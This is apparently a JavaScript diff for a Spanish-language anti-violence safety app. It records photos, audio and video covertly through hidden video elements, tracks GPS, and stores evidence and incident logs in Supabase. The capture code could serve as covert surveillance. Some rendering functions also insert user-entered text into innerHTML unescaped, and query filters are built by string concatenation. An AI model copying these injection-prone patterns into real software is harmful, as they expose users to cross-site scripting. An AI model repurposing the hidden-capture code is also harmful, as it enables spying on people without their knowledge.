+    if (!res.ok) throw new Error(await res.text());
+    if (res.status === 204) return [];
+    const text = await res.text();
+    return text ? JSON.parse(text) : [];
+}
+
+async function sincronizarActaEnNube(acta) {
+    try {
+        await asegurarSesionSupabase();
+        const copiaNube = Object.assign({}, acta);
+        if (copiaNube.videos) {
+            copiaNube.videos = copiaNube.videos.map(v => ({ url: v.url || v.rutaNativa || '', camara: v.camara || 'TRASERA' }));
+        }
+        if (copiaNube.audios) {
+            copiaNube.audios = copiaNube.audios.map(a => ({ url: a.url || a.rutaNativa || '' }));
+        }
+        const payloadStr = JSON.stringify(copiaNube);
+        const k = localStorage.getItem('llave_maestra');
+        const filtro = k ? ('llave_acceso=eq.' + LK(k)) : ('imei=eq.' + acta.imei);
+        await supaQuery('PATCH', 'c4_suscripciones?' + filtro, { datos_acta: payloadStr });
+        debugLog('☁️ Acta respaldada en Supabase con éxito.');
+    } catch(e) {
+        debugLog('❌ Error respaldando en nube: ' + e.message);
+    }
+}
+
+async function purgarActaVencidaEnSupabase(imeiPurga, llavePurga) {
+    try {
+        await asegurarSesionSupabase();
+        const filtro = llavePurga ? ('llave_acceso=eq.' + LK(llavePurga)) : ('imei=eq.' + imeiPurga);
+        await supaQuery('PATCH', 'c4_suscripciones?' + filtro, { datos_acta: null }).catch(()=>{});
+        const limiteIso = new Date(Date.now() - EXPIRACION_ACTA_MS).toISOString();
+        await supaQuery('DELETE', 'c4_emergencias?fecha_activacion=lt.' + encodeURIComponent(limiteIso)).catch(()=>{});
+        debugLog('🧹 Autodestrucción 24h ejecutada en Supabase.');
+    } catch(e) {
+        debugLog('Error purgando nube: ' + e.message);
+    }
+}
+
+async function solicitarTodosLosPermisos() {
+    debugLog('Solicitando permisos Web...');
+    
+    if(typeof DeviceMotionEvent !== 'undefined' && typeof DeviceMotionEvent.requestPermission === 'function'){
+        try { await DeviceMotionEvent.requestPermission(); debugLog('Permiso acelerómetro OK'); } catch(e){ debugLog('Permiso acelerómetro falló'); }
+    }
+    
+    return new Promise(async (resolve) => {
+        try {
+            navigator.geolocation.getCurrentPosition(
+                () => debugLog('GPS OK'),
+                (e) => debugLog('GPS error: ' + e.message),
+                {enableHighAccuracy: true, timeout: 10000}
+            );
+        } catch(e){}
+        try {
+            debugLog('Pidiendo cámara + micrófono avanzado...');
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                audio: { echoCancellation: true, noiseSuppression: true, autoGainControl: true }, 
+                video: { facingMode: 'environment', width: { ideal: 1920 }, height: { ideal: 1080 } } 
+            });
+            stream.getTracks().forEach(track => track.stop());
+            debugLog('Cámara + micrófono avanzado OK');
+        } catch(e) {
+            debugLog('Error getUserMedia: ' + e.message);
+            try {
+                const audioStream = await navigator.mediaDevices.getUserMedia({ audio: { echoCancellation: true, noiseSuppression: true, autoGainControl: true } });
+                audioStream.getTracks().forEach(t => t.stop());
+                debugLog('Solo audio OK');
+            } catch(e2) { debugLog('Audio también falló: ' + e2.message); }
+        }
+        resolve();
+    });
+}
+
+async function capturarFoto(cameraDirection) {
+    return new Promise(async (resolve, reject) => {
+        debugLog('Capturando foto Super HD 1920x1080: ' + cameraDirection);
+        let stream = null;
+        try {
+            const video = document.createElement('video');
+            video.muted = true; video.playsInline = true; video.setAttribute('playsinline', '');
+            video.style.position = 'fixed'; video.style.top = '0'; video.style.left = '0';
+            video.style.width = '1px'; video.style.height = '1px';
+            video.style.opacity = '0.001'; video.style.zIndex = '-1';
+            document.body.appendChild(video);
+            
+            stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: (cameraDirection === 'front' || cameraDirection === 'user') ? 'user' : 'environment', width: { ideal: 1920 }, height: { ideal: 1080 } },
+                audio: false
+            });
+            video.srcObject = stream;
+            await video.play();
+            await new Promise(r => setTimeout(r, 800));
+            
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 1920;
+            canvas.height = video.videoHeight || 1080;
+            const ctx = canvas.getContext('2d');
+            if (cameraDirection === 'front' || cameraDirection === 'user') { ctx.translate(canvas.width, 0); ctx.scale(-1, 1); }
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const dataUrl = canvas.toDataURL('image/jpeg', 0.92); 
+            
+            stream.getTracks().forEach(t => t.stop());
+            document.body.removeChild(video);
+            debugLog('Foto Super HD capturada: ' + (dataUrl.length / 1024).toFixed(0) + 'KB');
+            resolve(dataUrl);
+        } catch(e) {
+            debugLog('Error de foto: ' + e.message);
+            if(stream) stream.getTracks().forEach(t => t.stop());
+            reject(e);
+        }
+    });
+}
+
+async function capturarAudio(duracionMs) {
+    return new Promise(async (resolve, reject) => {
+        debugLog('Grabando audio forense HQ (128kbps)...');
+        let stream = null;
+        try {
+            stream = await navigator.mediaDevices.getUserMedia({ 
+                audio: { echoCancellation: true, noiseSuppression: true, autoGainControl: true, channelCount: 1, sampleRate: 48000 } 
+            });
+            const mimeTypes = ['audio/webm;codecs=opus', 'audio/webm', 'audio/mp4', 'audio/ogg;codecs=opus'];
+            let mimeType = '';
+            for (let mt of mimeTypes) { if (typeof MediaRecorder !== 'undefined' && MediaRecorder.isTypeSupported(mt)) { mimeType = mt; break; } }
+            const opciones = mimeType ? { mimeType, audioBitsPerSecond: 128000 } : { audioBitsPerSecond: 128000 };
+            const recorder = new MediaRecorder(stream, opciones);
+            const chunks = [];
+            recorder.ondataavailable = e => { if (e.data && e.data.size > 0) chunks.push(e.data); };
+            recorder.onstop = () => {
+                const blob = new Blob(chunks, { type: recorder.mimeType || mimeType || 'audio/webm' });
+                stream.getTracks().forEach(t => t.stop());
+                debugLog('Audio HQ OK: ' + (blob.size / 1024).toFixed(0) + 'KB');
+                resolve(blob);
+            };
+            recorder.start(1000);
+            setTimeout(() => { if (recorder.state === 'recording') recorder.stop(); }, duracionMs);
+        } catch(e) {
+            debugLog('Audio error: ' + e.message);
+            if(stream) stream.getTracks().forEach(t => t.stop());
+            reject(e);
+        }
+    });
+}
+
+async function capturarVideo(duracionMs, cameraDirection) {
+    return new Promise(async (resolve, reject) => {
+        const modoCamara = (cameraDirection === 'front' || cameraDirection === 'user') ? 'user' : 'environment';
+        debugLog('Grabando video HD 720p (15s): ' + modoCamara);
+        let stream = null;
+        let videoPreview = null;
+        try {
+            const videoConstraints = {
+                facingMode: modoCamara,
+                width: { ideal: 1280 },
+                height: { ideal: 720 },
+                frameRate: { ideal: 30, max: 30 }
+            };
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: videoConstraints,
+                    audio: { echoCancellation: true, noiseSuppression: true, autoGainControl: true }
+                });
+            } catch (errAudioVideo) {
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: videoConstraints,
+                    audio: false
+                });
+            }
+
+            videoPreview = document.createElement('video');
+            videoPreview.muted = true;
+            videoPreview.playsInline = true;
+            videoPreview.setAttribute('playsinline', '');
+            videoPreview.style.position = 'fixed';
+            videoPreview.style.top = '0';
+            videoPreview.style.left = '0';
+            videoPreview.style.width = '1px';
+            videoPreview.style.height = '1px';
+            videoPreview.style.opacity = '0.001';
+            videoPreview.style.zIndex = '-1';
+            document.body.appendChild(videoPreview);
+            videoPreview.srcObject = stream;
+            await videoPreview.play().catch(()=>{});
+            await new Promise(r => setTimeout(r, 400));
+
+            const mimeTypes = [
+                'video/webm;codecs=vp8,opus',
+                'video/webm;codecs=vp8',
+                'video/mp4',
+                'video/webm;codecs=h264',
+                'video/webm'
+            ];
+            let mimeType = '';
+            for (let mt of mimeTypes) {
+                if (typeof MediaRecorder !== 'undefined' && MediaRecorder.isTypeSupported(mt)) {
+                    mimeType = mt;
+                    break;
+                }
+            }
+            const opciones = mimeType 
+                ? { mimeType, videoBitsPerSecond: 1200000, audioBitsPerSecond: 128000 } 
+                : { videoBitsPerSecond: 1200000, audioBitsPerSecond: 128000 };
+            const recorder = new MediaRecorder(stream, opciones);
+            const chunks = [];
+            recorder.ondataavailable = e => {
+                if (e.data && e.data.size > 0) chunks.push(e.data);
+            };
+            recorder.onstop = () => {
+                const finalType = recorder.mimeType || mimeType || 'video/webm';
+                const blob = new Blob(chunks, { type: finalType });
+                stream.getTracks().forEach(t => t.stop());
+                if (videoPreview && videoPreview.parentNode) videoPreview.parentNode.removeChild(videoPreview);
+                debugLog('Video HD 720p OK: ' + (blob.size / 1024).toFixed(0) + 'KB');
+                resolve(blob);
+            };
+            recorder.start(1000);
+            setTimeout(() => {
+                if (recorder.state === 'recording') recorder.stop();
+            }, duracionMs);
+        } catch(e) {
+            debugLog('Video error: ' + e.message);
+            if(stream) stream.getTracks().forEach(t => t.stop());
+            if(videoPreview && videoPreview.parentNode) videoPreview.parentNode.removeChild(videoPreview);
+            reject(e);
+        }
+    });
+}
+
+async function pegarLlave(inputId) {
+    try {
+        const text = await navigator.clipboard.readText();
+        document.getElementById(inputId).value = LK(text);
+    } catch(e) { alert('No se pudo pegar automáticamente. Mantené presionado el cuadro de texto y seleccioná "Pegar".'); }
+}
+
+function verificarAvisoImei() {
+    const cajaImei = document.getElementById('cajaCompletarImei');
+    if (!cajaImei) return;
+    if (localStorage.getItem('ok') === '1' && localStorage.getItem('imei_pendiente') === '1') {
+        cajaImei.style.display = 'block';
+    } else {
+        cajaImei.style.display = 'none';
+    }
+}
+
+window.guardarImeiReal = async function() {
+    const nuevoImei = IM(document.getElementById('imeiPostRegistro').value);
+    if (!/^\d{15}$/.test(nuevoImei)) {
+        return alert('Por favor, ingresá los 15 números exactos de tu IMEI (podés verlo marcando *#06# en tu app de llamadas).');
+    }
+    const viejoImei = localStorage.getItem('imei');
+    try {
+        if (viejoImei) {
+            await authTrucha(viejoImei);
+            await supaQuery('PATCH', 'c4_suscripciones?imei=eq.' + viejoImei, { imei: nuevoImei }).catch(()=>{});
+        }
+        localStorage.setItem('imei', nuevoImei);
+        localStorage.removeItem('imei_pendiente');
+        document.getElementById('pI').value = nuevoImei;
+        if(document.getElementById('pI_display')) document.getElementById('pI_display').innerText = nuevoImei;
+        listaActas.forEach(a => { if(a.imei === viejoImei || a.imei === 'SIN_IMEI') a.imei = nuevoImei; });
+        await guardarActas();
+        verificarAvisoImei();
+        alert('✅ IMEI vinculado correctamente a tu Acta Pericial Judicial.');
+    } catch(e) {
+        localStorage.setItem('imei', nuevoImei);
+        localStorage.removeItem('imei_pendiente');
+        verificarAvisoImei();
+        alert('✅ IMEI guardado en el dispositivo para tus Actas Periciales.');
+    }
+};
+
+function activarBotonesSeguridad() {
+    let z = document.getElementById('zonaOk');
+    let b = document.getElementById('btn-flotante-sos');
+    if(z) { z.style.setProperty('display', 'block', 'important'); }
+    if(b) { b.style.setProperty('display', 'flex', 'important'); }
+    verificarAvisoImei();
+}
+
+function ocultarBotonesSeguridad() {
+    let z = document.getElementById('zonaOk');
+    let b = document.getElementById('btn-flotante-sos');
+    if(z) z.style.display = 'none';
+    if(b) b.style.display = 'none';
+}
+
+window.ir = async id => {
+    document.querySelectorAll('.vista').forEach(v=>v.classList.remove('activa'));
+    document.getElementById(id).classList.add('activa');
+
+    if(id === 'inicio' && localStorage.getItem('ok') === '1') {
+        verificarSuscripcion();
+    }
+
+    if(id === 'bitacora') {
+        cargarBitacora();
+        renderArchivosPendientes();
+    }
+
+    if(id === 'panel') {
+        await cargarActasLocales();
+        const c = document.getElementById('alertas');
+        const currentImei = localStorage.getItem('imei');
+        const currentLlave = localStorage.getItem('llave_maestra');
+        
+        if (currentImei || currentLlave) {
+            try {
+                await asegurarSesionSupabase();
+                const filtro = currentLlave ? ('llave_acceso=eq.' + LK(currentLlave)) : ('imei=eq.' + currentImei);
+                const resNube = await supaQuery('GET', 'c4_suscripciones?select=imei,llave_acceso,datos_acta&' + filtro);
+                if (resNube && resNube.length > 0 && resNube[0].datos_acta) {
+                    const actaNube = JSON.parse(resNube[0].datos_acta);
+                    if (actaNube && actaNube.sello_ms && (Date.now() - actaNube.sello_ms > EXPIRACION_ACTA_MS)) {
+                        await limpiarArchivosBucketActa(actaNube);
+                        await purgarActaVencidaEnSupabase(resNube[0].imei, resNube[0].llave_acceso);
+                    } else if (actaNube && actaNube.id && !listaActas.find(x => x.id === actaNube.id)) {
+                        listaActas.push(actaNube);
+                        await guardarActas();
+                    }
+                }
+            } catch(errNube) { debugLog('Error al verificar acta de nube: ' + errNube.message); }
+        }
+
+        let actasFiltradas = listaActas.filter(a => !currentImei || a.imei === currentImei || a.imei === 'SIN_IMEI');
+        if (actasFiltradas.length > 0) {
+            c.innerHTML = ''; 
+            actasFiltradas.forEach(render);
+        } else {
+            c.innerHTML = '<div class="caja" style="text-align:center;padding:50px 12px;border:none;box-shadow:none;"><p style="color:#999;font-weight:400;font-family:Cormorant Garamond,serif;font-style:italic;font-size:20px;">Sistema en calma - Sin emergencias</p></div>';
+        }
+        setTimeout(() => {
+            for (let key in mapas) {
+                if (mapas[key] && typeof mapas[key].invalidateSize === 'function') mapas[key].invalidateSize();
+            }
+        }, 400);
+    }
+};
+
+const irSOS = () => localStorage.getItem('ok') === '1' ? window.ir('sos') : window.ir('pago');
+
+let audioPresentacionFallback = null;
+
+function cerrarPresentacion() {
+    document.getElementById('modalPresentacion').style.display = 'none';
+    try { if ('speechSynthesis' in window) speechSynthesis.cancel(); } catch(e){}
+    if (audioPresentacionFallback) {
+        audioPresentacionFallback.pause();
+        audioPresentacionFallback = null;
+    }
+}
+
+function leerVoz(){
+    const textoMensaje = 'Bienvenidas al sistema judicial Energy Argentina dos mil veintiséis. Plataforma corporativa Ni Una Menos. Nuestra misión es salvar vidas mediante dos herramientas principales: el Botón Antipánico de impacto inmediato, y el nuevo Temporizador Centinela. El Temporizador es tu vigía personal. Si vas a salir, programá el tiempo de tu viaje y bloqueá la pantalla usando el Modo Sigilo. Si no cancelás el cronómetro antes de que termine, el sistema asumirá que estás en peligro y detonará automáticamente la recolección de evidencia. Además, estando en Modo Sigilo, el sistema cuenta con sensores biométricos ocultos: si recibís un sacudón violento o si pegás un grito fuerte de auxilio, se activará inmediatamente la alarma de rescate y recolección de evidencia, sin hacer ningún ruido. El sistema recaba fotos, videos, audios y señal de GPS, compilando toda la información en un acta pericial. Con tu llave criptográfica podés descargar esta acta, presentarla ante la fiscalía con todas las pruebas y realizar la denuncia correspondiente. Tu seguridad está en manos de profesionales. Basta de secuestro, basta de violencia, basta de maltrato. Ni una menos, llegó para salvar vidas.';
+
+    document.getElementById('modalPresentacion').style.display = 'flex';
+
+    let habloNativo = false;
+    try {
+        if ('speechSynthesis' in window) {
+            speechSynthesis.cancel();
+            const u = new SpeechSynthesisUtterance(textoMensaje);
+            u.lang = 'es-AR'; u.rate = 0.95; u.pitch = 1; u.volume = 1;
+            u.onstart = () => { habloNativo = true; };
+            speechSynthesis.speak(u);
+        }
+    } catch(e) {}
+
+    setTimeout(() => {
+        if (!habloNativo && (!window.speechSynthesis || !window.speechSynthesis.speaking)) {
+            try {
+                const resumenAudio = encodeURIComponent('Bienvenidas a Ni Una Menos Argentina. Activá hoy tus quince días gratis. Contás con botón antipánico, temporizador centinela y modo sigilo para recolectar pruebas judiciales de forma oculta.');
+                audioPresentacionFallback = new Audio('https://translate.google.com/translate_tts?ie=UTF-8&client=tw-ob&tl=es&q=' + resumenAudio);
+                audioPresentacionFallback.play().catch(()=>{});
+            } catch(e){}
+        }
+    }, 600);
+}
+
+window.sigilo = async () => {
+    await solicitarTodosLosPermisos();
+    alert("MODO SIGILO ARMADO\nLa pantalla se pondrá negra simulando estar apagada. Tocala 3 VECES RÁPIDAS para salir. En este modo los sensores de impacto y el micrófono oculto (detector de gritos fuertes) están 100% activos y silenciosos.");
+    cooldownRobo = true;
+    setTimeout(() => cooldownRobo = false, 3000);
+    
+    activarSensoresSacudon();
+    activarSensoresVoz();
+    
+    try { if ('wakeLock' in navigator) wakeLockObj = await navigator.wakeLock.request('screen'); }
+    catch (err) { debugLog('WakeLock error: ' + err.message); }
+    if (!audioKeepAlive) {
+        audioKeepAlive = new Audio('data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=');
+        audioKeepAlive.loop = true; audioKeepAlive.setAttribute('playsinline', '');
+        audioKeepAlive.volume = 0.01;
+        audioKeepAlive.play().catch(e => debugLog('Audio keepalive error: ' + e.message));
+    }
+    let s = document.createElement('div');
+    s.id = 'pantalla-sigilo';
+    document.body.appendChild(s);
+    let t = 0;
+    s.addEventListener('touchstart', () => {
+        t++; setTimeout(() => t = 0, 1000);
+        if(t >= 3) {
+            if (wakeLockObj !== null) { try { wakeLockObj.release(); } catch(e){} wakeLockObj = null; }
+            if (audioKeepAlive) { audioKeepAlive.pause(); audioKeepAlive = null; }
+            s.remove();
+            
+            voiceActive = false;
+            if (micStreamSigilo) micStreamSigilo.getTracks().forEach(tr=>tr.stop());
+            if (audioCtxActivo) audioCtxActivo.close();
+        }
+    });
+};
+
+async function sha256(message) {
+    try {
+        if(crypto && crypto.subtle) {
+            const msgBuffer = new TextEncoder().encode(message);
+            const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
+            const hashArray = Array.from(new Uint8Array(hashBuffer));
+            return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+        }
+    } catch(e) {}
+    let hash = 0;
+    for (let i = 0; i < message.length; i++) {
+        let char = message.charCodeAt(i);
+        hash = ((hash << 5) - hash) + char;
+        hash = hash & hash; 
+    }
+    return 'F-HASH-' + Math.abs(hash).toString(16) + '-' + Date.now().toString(16);
+}
+
+const initDB = () => new Promise((resolve) => {
+    let req = indexedDB.open('C4_DB', 2);
+    req.onupgradeneeded = e => {
+        if(!e.target.result.objectStoreNames.contains('actas')) e.target.result.createObjectStore('actas', {keyPath: 'id'});
+    };
+    req.onsuccess = e => resolve(e.target.result);
+});
+
+async function guardarActas() {
+    try {
+        let db = await initDB();
+        let tx = db.transaction('actas', 'readwrite');
+        let store = tx.objectStore('actas');
+        listaActas.forEach(a => store.put(a));
+    } catch(e) { debugLog('guardarActas error: ' + e.message); }
+}
+
+async function cargarActasLocales() {
+    try {
+        let db = await initDB();
+        return new Promise(resolve => {
+            let tx = db.transaction('actas', 'readwrite');
+            let store = tx.objectStore('actas');
+            let req = store.getAll();
+            req.onsuccess = e => {
+                let actas = e.target.result || [];
+                let ahora = Date.now();
+                let huboExpiradas = false;
+                listaActas = actas.filter(a => {
+                    if (a.sello_ms && (ahora - a.sello_ms > EXPIRACION_ACTA_MS)) {
+                        limpiarArchivosBucketActa(a);
+                        db.transaction('actas', 'readwrite').objectStore('actas').delete(a.id);
+                        huboExpiradas = true;
+                        return false;
+                    }
+                    return true;
+                });
+                if (huboExpiradas) {
+                    purgarActaVencidaEnSupabase(localStorage.getItem('imei'), localStorage.getItem('llave_maestra'));
+                }
+                resolve();
+            };
+        });
+    } catch(e) { debugLog('cargarActasLocales error: ' + e.message); listaActas = []; }
+}
+
+async function borrarActa(id) {
+    if(!confirm('¿Estás segura de eliminar este expediente permanentemente?')) return;
+    const actaABorrar = listaActas.find(a => a.id === id);
+    if (actaABorrar) await limpiarArchivosBucketActa(actaABorrar);
+    if(mapas[id]) { try { mapas[id].remove(); } catch(e){} delete mapas[id]; }
+    const d = document.getElementById('a_'+id);
+    if(d) d.remove();
+    listaActas = listaActas.filter(a => a.id !== id);
+    let db = await initDB();
+    let tx = db.transaction('actas', 'readwrite');
+    tx.objectStore('actas').delete(id);
+    purgarActaVencidaEnSupabase(localStorage.getItem('imei'), localStorage.getItem('llave_maestra'));
+    if(listaActas.filter(a => a.imei === localStorage.getItem('imei') || a.imei === 'SIN_IMEI').length === 0) {
+        document.getElementById('alertas').innerHTML = '<div class="caja" style="text-align:center;padding:50px 12px;border:none;box-shadow:none;"><p style="color:#999;font-weight:400;font-family:Cormorant Garamond,serif;font-style:italic;font-size:20px;">Sistema en calma - Sin emergencias</p></div>';
+    }
+}
+
+function formatFileSize(bytes) {
+    if (!bytes && bytes !== 0) return '';
+    if (bytes < 1024) return bytes + ' B';
+    if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
+    return (bytes / 1048576).toFixed(2) + ' MB';
+}
+
+function tipoIcono(tipo) {
+    if (!tipo) return 'ARC';
+    if (tipo.startsWith('image/')) return 'IMG';
+    if (tipo.startsWith('video/')) return 'VID';
+    if (tipo.startsWith('audio/')) return 'AUD';
+    return 'ARC';
+}
+
+function renderArchivosPendientes() {
+    const cont = document.getElementById('listaArchivosPendientes');
+    if (!cont) return;
+    if (archivosPendientesBitacora.length === 0) {
+        cont.innerHTML = '';
+        return;
+    }
+    cont.innerHTML = '<div style="font-family:Cinzel,serif;font-weight:900;letter-spacing:3px;font-size:12px;color:var(--oroOscuro);text-align:center;margin-bottom:10px;">EVIDENCIA ACUMULADA: ' + archivosPendientesBitacora.length + ' ARCHIVO(S)</div>' +
+        archivosPendientesBitacora.map((f, i) => `
+            <div class="archivo-pendiente">
+                <div class="ico">${tipoIcono(f.type)}</div>
+                <div class="datos">
+                    <b title="${(f.name||'').replace(/"/g,'&quot;')}">${f.name || ('Archivo ' + (i+1))}</b>
+                    <span>${formatFileSize(f.size)} · ${f.type || 'archivo'}</span>
+                </div>
+                <button type="button" class="quitar" onclick="quitarArchivoPendiente(${i})" title="Quitar este archivo">×</button>
+            </div>
+        `).join('');
+}
+
+function agregarArchivosBitacora(inputEl) {
+    const recienSeleccionados = Array.from(inputEl.files || []);
+    let agregados = 0;
+    for (const f of recienSeleccionados) {
+        const duplicado = archivosPendientesBitacora.some(p => p.name === f.name && p.size === f.size && p.lastModified === f.lastModified);
+        if (!duplicado) { archivosPendientesBitacora.push(f); agregados++; }
+    }
+    inputEl.value = '';
+    document.getElementById('bFileName').innerHTML = 'TOCÁ OTRA VEZ PARA SUMAR MÁS<br>ARCHIVOS A LA MISMA LISTA';
+    renderArchivosPendientes();
+    if (agregados === 0 && recienSeleccionados.length > 0) {
+        alert('Esos archivos ya estaban en la lista. Se pueden repetir nombres pero no el mismo archivo.');
+    }
+}
+
+function quitarArchivoPendiente(idx) {
+    archivosPendientesBitacora.splice(idx, 1);
+    renderArchivosPendientes();
+}
+
+async function guardarIncidente() {
+    const tipo = document.getElementById('bTipo').value.trim();
+    const fecha = document.getElementById('bFecha').value || new Date().toLocaleString('es-AR');
+    const lugar = document.getElementById('bLugar').value.trim() || 'No especificado';
+    const relato = document.getElementById('bRelato').value.trim();
+    const imei = localStorage.getItem('imei') || 'SIN_IMEI';
+    const llave = localStorage.getItem('llave_maestra') || '';
+
+    if (!tipo || !relato) return alert('Por favor, completá el tipo de incidente y el relato de lo ocurrido.');
+
+    const btn = document.getElementById('btnGuardarBitacora');
+    btn.innerText = archivosPendientesBitacora.length > 0
+        ? 'SUBIENDO ' + archivosPendientesBitacora.length + ' ARCHIVO(S)...'
+        : 'GUARDANDO INCIDENTE...';
+    btn.disabled = true;
+
+    try {
+        await asegurarSesionSupabase();
+        const urls = [];
+        const marca = Date.now();
+        for (let i = 0; i < archivosPendientesBitacora.length; i++) {
+            const f = archivosPendientesBitacora[i];
+            const ext = (f.name || '').split('.').pop() || 'bin';
+            const urlSubida = await subirArchivoBucket(f, 'BITACORA_' + imei, 'evidencia_' + marca + '_' + i, ext, f.type || 'application/octet-stream');
+            if (urlSubida) urls.push({ nombre: f.name, url: urlSubida, tipo: f.type, tamano: f.size });
+        }
+
+        const selloHash = await sha256(imei + fecha + tipo + relato + marca + urls.length);
+
+        await supaQuery('POST', 'c4_bitacora', {
+            imei: imei,
+            llave_acceso: LK(llave),
+            fecha_suceso: fecha,
+            lugar: lugar,
+            tipo_incidente: tipo,
+            relato: relato,
+            archivos_urls: urls,
+            hash_integridad: selloHash
+        });
+
+        document.getElementById('bTipo').value = '';
+        document.getElementById('bLugar').value = '';
+        document.getElementById('bRelato').value = '';
+        document.getElementById('bArchivos').value = '';
+        archivosPendientesBitacora = [];
+        renderArchivosPendientes();
+        document.getElementById('bFileName').innerHTML = 'TOCÁ AQUÍ PARA SUMAR ARCHIVOS<br>SE ACUMULAN TODOS HASTA GUARDAR';
+
+        alert('✅ Incidente guardado con ' + urls.length + ' archivo(s) de evidencia. Seguí sumando más incidentes: todos se exportan juntos en un solo acta.');
+        cargarBitacora();
+    } catch (e) {
+        alert('Error guardando el incidente: ' + e.message);
+    } finally {
+        btn.innerText = 'GUARDAR EN CRONOLOGÍA';
+        btn.disabled = false;
+    }
+}
+
+function agregarEvidenciaExistente(idIncidente) {
+    idIncidenteAgregarEvidencia = idIncidente;
+    const input = document.getElementById('inputAgregarEvidencia');
+    if (input) { input.value = ''; input.click(); }
+}
+
+document.addEventListener('change', async function(e) {
+    if (e.target && e.target.id === 'inputAgregarEvidencia') {
+        const idInc = idIncidenteAgregarEvidencia;
+        if (!idInc) return;
+        const nuevos = Array.from(e.target.files || []);
+        if (nuevos.length === 0) return;
+        if (!confirm('Se van a sumar ' + nuevos.length + ' archivo(s) a este incidente. ¿Continuar?')) { e.target.value = ''; return; }
+        try {
+            await asegurarSesionSupabase();
+            const imei = localStorage.getItem('imei') || 'SIN_IMEI';
+            const marca = Date.now();
+            const urlsNuevas = [];
+            for (let i = 0; i < nuevos.length; i++) {
+                const f = nuevos[i];
+                const ext = (f.name || '').split('.').pop() || 'bin';
+                const urlSubida = await subirArchivoBucket(f, 'BITACORA_' + imei, 'evidencia_extra_' + marca + '_' + i, ext, f.type || 'application/octet-stream');
+                if (urlSubida) urlsNuevas.push({ nombre: f.name, url: urlSubida, tipo: f.type, tamano: f.size });
+            }
+            const actual = await supaQuery('GET', 'c4_bitacora?select=archivos_urls,hash_integridad&id=eq.' + idInc);
+            let existentes = (actual && actual[0] && Array.isArray(actual[0].archivos_urls)) ? actual[0].archivos_urls : [];
+            const combinadas = existentes.concat(urlsNuevas);
+            const nuevoHash = await sha256((actual && actual[0] && actual[0].hash_integridad ? actual[0].hash_integridad : '') + marca + urlsNuevas.length);
+            await supaQuery('PATCH', 'c4_bitacora?id=eq.' + idInc, { archivos_urls: combinadas, hash_integridad: nuevoHash });
+            alert('✅ Se sumaron ' + urlsNuevas.length + ' evidencia(s) al incidente.');
+            cargarBitacora();
+        } catch (err) {
+            alert('Error al agregar evidencia: ' + err.message);
+        } finally {
+            e.target.value = '';
+            idIncidenteAgregarEvidencia = null;
+        }
+    }
+});
+
+async function borrarIncidente(idIncidente) {
+    if (!confirm('¿Estás segura de eliminar este incidente y sus archivos adjuntos de la cronología?')) return;
+    try {
+        await asegurarSesionSupabase();
+        const token = currentJWT ? currentJWT : SUPA_KEY;
+        const res = await supaQuery('GET', 'c4_bitacora?select=archivos_urls&id=eq.' + idIncidente);
+        if (res && res.length > 0 && Array.isArray(res[0].archivos_urls)) {
+            const prefijo = `/storage/v1/object/public/${SUPA_BUCKET}/`;
+            for (const a of res[0].archivos_urls) {
+                if (a && typeof a.url === 'string' && a.url.includes(prefijo)) {
+                    const filePath = a.url.split(prefijo)[1];
+                    if (filePath) {
+                        fetch(`${SUPA_URL}/storage/v1/object/${SUPA_BUCKET}/${filePath}`, {
+                            method: 'DELETE',
+                            headers: { 'apikey': SUPA_KEY, 'Authorization': 'Bearer ' + token }
+                        }).catch(()=>{});
+                    }
+                }
+            }
+        }
+        await supaQuery('DELETE', 'c4_bitacora?id=eq.' + idIncidente);
+        const card = document.getElementById('inc_' + idIncidente);
+        if (card) card.remove();
+        cargarBitacora();
+    } catch (e) {
+        alert('Error al eliminar el incidente: ' + e.message);
+    }
+}
+
+async function cargarBitacora() {
+    const cont = document.getElementById('listaBitacora');
+    if (!cont) return;
+    const imei = localStorage.getItem('imei');
+    const llave = localStorage.getItem('llave_maestra');
+    if (!imei && !llave) return;
+
+    try {
+        await asegurarSesionSupabase();
+        const filtro = llave ? ('llave_acceso=eq.' + LK(llave)) : ('imei=eq.' + imei);
+        const res = await supaQuery('GET', 'c4_bitacora?select=*&' + filtro + '&order=creado_en.desc');
+        if (!res || res.length === 0) {
+            cont.innerHTML = '<p style="text-align:center;color:#999;font-size:14px;">Aún no hay incidentes registrados en tu diario.</p>';
+            return;
+        }
+        cont.innerHTML = res.map((item, idx) => {
+            const links = (item.archivos_urls || []).map((a, i) => {
+                const nombreSeguro = (a.nombre || ('EVIDENCIA_' + (i + 1))).replace(/['"]/g, '');
+                return `<button type="button" class="btn-descarga-evidencia noimp" onclick="forzarDescargaArchivo('${a.url}', '${nombreSeguro}')" style="margin:4px;font-size:11px;padding:8px 14px;">📎 DESCARGAR ORIGINAL ${i+1} (${nombreSeguro})</button>`;
+            }).join('');
+            return `<div class="acta" id="inc_${item.id}" style="margin-bottom:15px;padding:18px;padding-right:52px;">
+                <div class="noimp" style="position:absolute;top:12px;right:12px;z-index:4">
+                    <button onclick="borrarIncidente('${item.id}')" title="Eliminar incidente" style="width:34px;height:34px;border-radius:6px;border:none;background:#B00020;color:#fff;font-family:Cinzel,serif;font-weight:bold;font-size:16px;cursor:pointer;box-shadow:0 2px 5px rgba(0,0,0,0.25);">X</button>
+                </div>
+                <div class="nroExpediente">INCIDENTE #${res.length - idx} — ${item.tipo_incidente.toUpperCase()}</div>
+                <div style="font-size:13px;color:#8B0000;font-weight:800;margin-bottom:8px;">FECHA: ${item.fecha_suceso} | LUGAR: ${item.lugar}</div>
+                <p style="font-family:Montserrat,sans-serif;font-size:14px;color:#222;line-height:1.6;margin-bottom:10px;">${item.relato}</p>
+                <div style="font-size:12px;color:var(--oroOscuro);font-weight:800;margin-bottom:6px;letter-spacing:1px;font-family:Cinzel,serif;">EVIDENCIAS ADJUNTAS: ${(item.archivos_urls||[]).length}</div>
+                <div>${links}</div>
+                <button type="button" class="btn-agregar-evidencia noimp" onclick="agregarEvidenciaExistente('${item.id}')">AGREGAR MAS EVIDENCIA A ESTE INCIDENTE</button>
